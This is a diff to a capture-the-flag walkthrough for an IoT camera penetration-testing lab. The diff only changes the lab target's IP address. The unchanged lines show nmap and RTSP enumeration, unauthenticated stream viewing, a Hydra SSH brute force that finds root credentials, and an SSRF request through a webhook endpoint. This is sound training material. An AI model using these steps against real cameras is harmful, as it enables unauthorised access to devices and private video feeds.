@@ -11,8 +11,8 @@
 ---
 
 ## Target Information
-- **AXIS Camera IP**: 192.168.1.132
-- **Your Kali Machine**: 192.168.1.133
+- **AXIS Camera IP**: 192.168.148.103
+- **Your Kali Machine**: 192.168.xxx.xxx
 - **Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)
 - **Focus**: Real-world IoT camera vulnerabilities based on OWASP IoT Top 10
 
@@ -111,18 +111,18 @@ Reconnaissance is the foundation of any successful penetration test. In IoT asse
 
 ```bash
 # Verify the target is online
-ping -c 4 192.168.1.132
+ping -c 4 192.168.148.103
 ```
 
 **Expected Output:**
 ```
-PING 192.168.1.132 (192.168.1.132) 56(84) bytes of data.
-64 bytes from 192.168.1.132: icmp_seq=1 ttl=64 time=0.428 ms
-64 bytes from 192.168.1.132: icmp_seq=2 ttl=64 time=0.392 ms
-64 bytes from 192.168.1.132: icmp_seq=3 ttl=64 time=0.401 ms
-64 bytes from 192.168.1.132: icmp_seq=4 ttl=64 time=0.389 ms
+PING 192.168.148.103 (192.168.148.103) 56(84) bytes of data.
+64 bytes from 192.168.148.103: icmp_seq=1 ttl=64 time=0.428 ms
+64 bytes from 192.168.148.103: icmp_seq=2 ttl=64 time=0.392 ms
+64 bytes from 192.168.148.103: icmp_seq=3 ttl=64 time=0.401 ms
+64 bytes from 192.168.148.103: icmp_seq=4 ttl=64 time=0.389 ms
 
---- 192.168.1.132 ping statistics ---
+--- 192.168.148.103 ping statistics ---
 4 packets transmitted, 4 received, 0% packet loss
 ```
 
@@ -137,13 +137,13 @@ PING 192.168.1.132 (192.168.1.132) 56(84) bytes of data.
 
 ```bash
 # Quick SYN scan with version detection
-sudo nmap -sS -sV -T4 192.168.1.132 -oA scans/tcp_quick
+sudo nmap -sS -sV -T4 192.168.148.103 -oA scans/tcp_quick
 ```
 
 **Expected Output:**
 ```
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-27 10:00:00 EST
-Nmap scan report for 192.168.1.132
+Nmap scan report for 192.168.148.103
 Host is up (0.00039s latency).
 Not shown: 996 closed tcp ports (reset)
 PORT     STATE SERVICE    VERSION
@@ -166,19 +166,19 @@ Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
 
 ```bash
 # Full TCP port scan (all 65535 ports)
-sudo nmap -sS -sV -sC -p- -oA scans/tcp_full 192.168.1.132
+sudo nmap -sS -sV -sC -p- -oA scans/tcp_full 192.168.148.103
 ```
 
 ### SSH Banner Analysis
 
 ```bash
 # Grab the SSH banner to identify the device
-nc -nv 192.168.1.132 22
+nc -nv 192.168.148.103 22
 ```
 
 **Expected Output:**
 ```
-Connection to 192.168.1.132 22 port [tcp/*] succeeded!
+Connection to 192.168.148.103 22 port [tcp/*] succeeded!
 SSH-2.0-OpenSSH_7.4
 *************************************************
 * AXIS Camera SSH Service                      *
@@ -196,7 +196,7 @@ SSH-2.0-OpenSSH_7.4
 
 ```bash
 # Enumerate RTSP methods
-nmap -p554 --script rtsp-methods,rtsp-url-brute 192.168.1.132
+nmap -p554 --script rtsp-methods,rtsp-url-brute 192.168.148.103
 ```
 
 **Expected Output:**
@@ -207,15 +207,15 @@ PORT    STATE SERVICE
 |   OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
 | rtsp-url-brute: 
 |   Discovered URLs
-|     rtsp://192.168.1.132:554/stream1
-|     rtsp://192.168.1.132:554/live
+|     rtsp://192.168.148.103:554/stream1
+|     rtsp://192.168.148.103:554/live
 ```
 
 ```bash
 # Try to access stream without authentication (often works on IoT)
-ffplay rtsp://192.168.1.132:554/stream1
+ffplay rtsp://192.168.148.103:554/stream1
 # or
-vlc rtsp://192.168.1.132:554/stream1
+vlc rtsp://192.168.148.103:554/stream1
 ```
 
 > **Note**: RTSP streams on IoT cameras often have weak or no authentication. Document any accessible streams as a finding.
@@ -265,16 +265,16 @@ EOF
 
 ```bash
 # Targeted SSH brute force
-hydra -L axis_users.txt -P axis_passwords.txt ssh://192.168.1.132 -t 4 -V
+hydra -L axis_users.txt -P axis_passwords.txt ssh://192.168.148.103 -t 4 -V
 ```
 
 **Expected Output:**
 ```
 Hydra v9.4 (c) 2022 by van Hauser/THC
 [DATA] max 4 tasks per 1 server
-[DATA] attacking ssh://192.168.1.132:22/
-[ATTEMPT] target 192.168.1.132 - login "root" - pass "pass"
-[22][ssh] host: 192.168.1.132   login: root   password: pass
+[DATA] attacking ssh://192.168.148.103:22/
+[ATTEMPT] target 192.168.148.103 - login "root" - pass "pass"
+[22][ssh] host: 192.168.148.103   login: root   password: pass
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -286,7 +286,7 @@ Hydra v9.4 (c) 2022 by van Hauser/THC
 
 ```bash
 # Connect via SSH
-ssh root@192.168.1.132
+ssh root@192.168.148.103
 # Password: pass
 ```
 
@@ -1725,7 +1725,7 @@ Certificate:
         X509v3 extensions:
             X509v3 Subject Alternative Name: 
                 DNS:axis-camera.local, DNS:axis-m1025.internal
-                IP Address:192.168.1.132
+                IP Address:192.168.148.103
             X509v3 Extended Key Usage: 
                 TLS Web Server Authentication, TLS Web Client Authentication
             Axis Internal Identifier:
@@ -2206,7 +2206,7 @@ console=ttyS0,115200
 bootargs=console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=ext4 rw
 
 # Network boot
-ipaddr=192.168.1.132
+ipaddr=192.168.148.103
 serverip=192.168.1.1
 netmask=255.255.255.0
 
@@ -2357,7 +2357,7 @@ fi
 
 ```bash
 # Simulate accessing the webhook endpoint with internal URL
-# In real pentest: curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://localhost:8080/internal"
+# In real pentest: curl "http://192.168.148.103/axis-cgi/webhook.cgi?url=http://localhost:8080/internal"
 
 # Let's check what's running on localhost:8080
 curl http://localhost:8080/
